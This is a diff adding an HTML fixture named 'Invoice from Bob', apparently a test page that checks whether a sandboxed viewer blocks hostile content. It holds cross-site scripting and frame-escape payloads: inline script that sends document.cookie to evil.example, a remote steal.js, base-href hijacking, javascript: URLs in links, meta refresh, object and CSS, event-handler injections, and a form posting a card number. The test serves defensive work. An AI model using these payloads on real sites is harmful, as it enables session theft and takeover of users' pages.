@@ -1,0 +1,32 @@
+<!doctype html>
+<html>
+<head>
+<base href="http://evil.example/">
+<meta http-equiv="refresh" content="0;url=javascript:parent.__pwned='refresh'">
+<title>Invoice from Bob</title>
+<script>
+  try { window.top.__pwned = 'inline script' } catch (e) {}
+  try { parent.document.title = 'PWNED' } catch (e) {}
+  try { localStorage.setItem('pwned', '1') } catch (e) {}
+  try { top.location = 'http://evil.example/stolen?' + document.cookie } catch (e) {}
+</script>
+<script src="http://evil.example/steal.js"></script>
+</head>
+<body onload="parent.__pwned='body onload'">
+<h1 id="headline">Invoice from Bob</h1>
+<p id="words">This page tries every trick it can. None of them should work, but this text should still show.</p>
+<img src="does-not-exist.png" onerror="top.__pwned='img onerror'; top.document.title='PWNED'">
+<img src="leaf.svg" alt="relative picture" width="48" height="48">
+<svg onload="top.__pwned='svg onload'" width="10" height="10"><rect width="10" height="10"/></svg>
+<p><a id="jslink" href="javascript:top.__pwned='javascript link';top.document.title='PWNED'">Click to pay</a></p>
+<p><a id="outlink" href="link-target.html">An ordinary relative link</a></p>
+<p><a id="selflink" href="welcome.html" target="_self">A link that tries to open in this frame</a></p>
+<form id="form" action="http://127.0.0.1:8732/me/public/suite-data/document/form-target" method="post">
+  <input name="card" value="4111 1111 1111 1111">
+  <button id="send" type="submit">Send card number</button>
+</form>
+<iframe srcdoc="<script>top.__pwned='nested frame'</script>"></iframe>
+<object data="javascript:top.__pwned='object'"></object>
+<div style="background:url(javascript:top.__pwned='css')">.</div>
+</body>
+</html>
